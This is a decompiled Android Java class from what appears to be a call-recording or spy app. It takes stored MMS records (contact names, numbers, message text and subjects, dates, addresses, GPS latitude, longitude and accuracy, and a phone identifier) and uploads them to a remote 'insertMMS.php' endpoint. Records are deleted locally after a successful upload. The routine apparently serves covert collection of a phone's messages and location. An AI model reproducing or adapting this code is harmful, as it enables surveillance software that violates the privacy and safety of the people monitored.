package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.D;
import a.c.b.Y;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

/* compiled from: SendMMS */
public class k implements Runnable {

    /* renamed from: c reason: collision with root package name */
    public static boolean f280c;

    /* renamed from: a reason: collision with root package name */
    private final Context f281a;

    /* renamed from: b reason: collision with root package name */
    private String f282b = "__,__";

    public k(Context context) {
        this.f281a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f281a.stopService(new Intent(this.f281a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:29:0x0224 A[Catch:{ Exception -> 0x0228 }] */
    public void run() {
        try {
            if (f280c) {
                a();
                return;
            }
            f280c = true;
            Y y = new Y(this.f281a);
            y.b();
            Cursor c2 = y.c();
            if (c2 == null || c2.getCount() <= 0 || !c2.moveToFirst()) {
                y.a();
                if (c2 != null) {
                    c2.close();
                }
                f280c = false;
                a();
            }
            do {
                D d2 = new D();
                d2.a(c2.getInt(0));
                d2.g(c2.getString(1));
                d2.h(c2.getString(2));
                d2.f(c2.getString(3));
                d2.b(c2.getInt(4));
                d2.c(c2.getString(5));
                d2.b(c2.getString(6));
                d2.e(c2.getString(7));
                d2.d(c2.getString(8));
                d2.a(c2.getString(9));
                d2.i(c2.getString(10));
                HashMap hashMap = new HashMap();
                String string = c2.getString(11);
                ArrayList arrayList = new ArrayList();
                arrayList.addAll(Arrays.asList(string.split(this.f282b)));
                String str = "dataSize";
                String str2 = "";
                if (!arrayList.isEmpty()) {
                    Iterator it = arrayList.iterator();
                    int i = 0;
                    while (it.hasNext()) {
                        String str3 = (String) it.next();
                        StringBuilder sb = new StringBuilder();
                        sb.append("data");
                        sb.append(i);
                        String sb2 = sb.toString();
                        StringBuilder sb3 = new StringBuilder();
                        sb3.append(str2);
                        sb3.append(str3);
                        hashMap.put(sb2, sb3.toString());
                        i++;
                    }
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append(str2);
                    sb4.append(arrayList.size());
                    hashMap.put(str, sb4.toString());
                } else {
                    hashMap.put(str, "0");
                }
                StringBuilder sb5 = new StringBuilder();
                sb5.append(str2);
                sb5.append(e.e(this.f281a));
                hashMap.put("idPhone", sb5.toString());
                StringBuilder sb6 = new StringBuilder();
                sb6.append(str2);
                sb6.append(d2.i());
                hashMap.put("name", sb6.toString());
                StringBuilder sb7 = new StringBuilder();
                sb7.append(str2);
                sb7.append(d2.j());
                hashMap.put("number", sb7.toString());
                StringBuilder sb8 = new StringBuilder();
                sb8.append(str2);
                sb8.append(d2.h());
                hashMap.put("message", sb8.toString());
                StringBuilder sb9 = new StringBuilder();
                sb9.append(str2);
                sb9.append(d2.l());
                hashMap.put("type", sb9.toString());
                StringBuilder sb10 = new StringBuilder();
                sb10.append(str2);
                sb10.append(d2.d());
                hashMap.put("date", sb10.toString());
                StringBuilder sb11 = new StringBuilder();
                sb11.append(str2);
                sb11.append(d2.b());
                hashMap.put("address", sb11.toString());
                StringBuilder sb12 = new StringBuilder();
                sb12.append(str2);
                sb12.append(d2.g());
                hashMap.put("longitude", sb12.toString());
                StringBuilder sb13 = new StringBuilder();
                sb13.append(str2);
                sb13.append(d2.f());
                hashMap.put("latitude", sb13.toString());
                StringBuilder sb14 = new StringBuilder();
                sb14.append(str2);
                sb14.append(d2.a());
                hashMap.put("accuracy", sb14.toString());
                StringBuilder sb15 = new StringBuilder();
                sb15.append(str2);
                sb15.append(d2.k());
                hashMap.put("subject", sb15.toString());
                if (a.b("mms/insertMMS.php", (Map<String, String>) hashMap)) {
                    y.a(d2.e());
                }
            } while (c2.moveToNext());
            y.a();
            if (c2 != null) {
            }
            f280c = false;
            a();
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }
}
